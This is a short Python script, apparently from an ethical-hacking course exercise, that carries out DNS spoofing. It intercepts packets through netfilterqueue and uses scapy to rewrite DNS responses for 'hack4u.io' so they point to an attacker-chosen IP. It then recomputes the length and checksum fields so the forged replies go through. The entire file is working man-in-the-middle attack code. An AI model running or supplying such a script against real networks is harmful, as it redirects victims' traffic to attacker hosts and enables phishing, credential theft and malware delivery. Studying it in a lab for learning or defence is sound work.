#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import signal
import sys

def def_handler(sig, frame):
    print(f"\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        #print(scapy_packet)
        qname = scapy_packet[scapy.DNSQR].qname # para obtener el nombre de dominio

        if b"hack4u.io" in qname:
            print(f"\n[+] Envenenando el dominio hack4u.io")
            
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.40") # en rdata poner nuestra IP    
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1 # para que no de conflictos

            del scapy_packet[scapy.IP].len # borramos el campo de longitud
            del scapy_packet[scapy.IP].chksum # borramos el campo de checksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(scapy_packet.build()) # con build() pones el paquete en formato bytes

    packet.accept() # sin esto no se puede navegar porqyue el tráfico no se acepta 

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) # 0 es el número de cola
queue.run() # Está continuamente analizando